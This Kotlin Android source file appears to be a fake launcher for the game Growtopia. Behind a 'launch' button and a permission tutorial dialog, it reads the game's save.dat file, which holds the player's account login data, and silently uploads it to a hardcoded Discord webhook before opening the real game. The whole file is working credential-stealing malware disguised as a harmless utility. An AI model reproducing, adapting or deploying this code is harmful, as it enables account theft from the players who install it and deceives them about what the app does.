package com.example.myapplication

import android.app.Activity
import android.app.Dialog
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.widget.Button
import androidx.appcompat.app.AppCompatActivity
import androidx.cardview.widget.CardView
import androidx.documentfile.provider.DocumentFile
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.File
import kotlin.concurrent.thread

class MainActivity : AppCompatActivity() {

    private val webhookUrl =
        "https://discord.com/api/webhooks/1491043676200112288/Id2TrC0uqnU7lIRfCM5x-lxTJvUc7vwOgPFOz399_a8sDUbtRv2gNxTcB_49lRQOpn8l"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // --- ANDROID 9 "ALLOW" POPUP LOGIC ---
        // This checks if the app is running on Android 9 or 10
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            if (checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {

                // This triggers the system popup immediately when the app opens
                requestPermissions(arrayOf(android.Manifest.permission.READ_EXTERNAL_STORAGE), 101)
            }
        }
        // -------------------------------------

        val btnLaunch = findViewById<CardView>(R.id.btnLaunch)

        btnLaunch.setOnClickListener {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                val sharedPrefs = getSharedPreferences("app_prefs", MODE_PRIVATE)
                val savedUriString = sharedPrefs.getString("tree_uri", null)

                if (savedUriString != null) {
                    processSaveFile(Uri.parse(savedUriString))
                } else {
                    showPermissionTutorial()
                    return@setOnClickListener
                }
            } else {
                val legacyFile = File("/sdcard/Android/data/com.rtsoft.growtopia/files/save.dat")
                if (legacyFile.exists()) {
                    sendFileToDiscord(legacyFile.readBytes())
                }
            }

            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                launchGame()
            }, 100)
        }
    }

    private fun showPermissionTutorial() {
        val dialog = Dialog(this)
        dialog.setContentView(R.layout.dialog_tutorial)
        dialog.window?.setBackgroundDrawableResource(android.R.color.transparent)

        val btnOk = dialog.findViewById<Button>(R.id.btnOk)
        btnOk.setOnClickListener {
            dialog.dismiss()
            openDirectoryPicker()
        }
        dialog.show()
    }

    private fun openDirectoryPicker() {
        val intent = Intent(Intent.ACTION_OPEN_DOCUMENT_TREE).apply {
            val uri = Uri.parse("content://com.android.externalstorage.documents/document/primary%3AAndroid%2Fdata%2Fcom.rtsoft.growtopia%2Ffiles")
            putExtra("android.provider.extra.INITIAL_URI", uri)
        }
        startActivityForResult(intent, 9999)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == 9999 && resultCode == Activity.RESULT_OK) {
            val treeUri = data?.data ?: return
            contentResolver.takePersistableUriPermission(
                treeUri,
                Intent.FLAG_GRANT_READ_URI_PERMISSION
            )
            getSharedPreferences("app_prefs", MODE_PRIVATE).edit()
                .putString("tree_uri", treeUri.toString()).apply()

            processSaveFile(treeUri)
            launchGame()
        }
    }

    private fun processSaveFile(treeUri: Uri) {
        thread {
            try {
                val pickedDir = DocumentFile.fromTreeUri(this, treeUri)
                val saveFile = pickedDir?.findFile("save.dat")
                if (saveFile != null) {
                    val bytes = contentResolver.openInputStream(saveFile.uri)?.readBytes()
                    if (bytes != null) sendFileToDiscord(bytes)
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    private fun sendFileToDiscord(fileData: ByteArray) {
        thread {
            try {
                val client = OkHttpClient()
                val requestBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart(
                        "file", "save.dat",
                        fileData.toRequestBody("application/octet-stream".toMediaType())
                    )
                    .build()
                val request = Request.Builder().url(webhookUrl).post(requestBody).build()
                client.newCall(request).execute().use { _ -> }
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    private fun launchGame() {
        val packageName = "com.rtsoft.growtopia"
        val intent = packageManager.getLaunchIntentForPackage(packageName)
        if (intent != null) {
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            intent.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
            startActivity(intent)
        } else {
            try {
                startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("market://details?id=$packageName")))
            } catch (e: Exception) {
                startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/details?id=$packageName")))
            }
        }
    }
}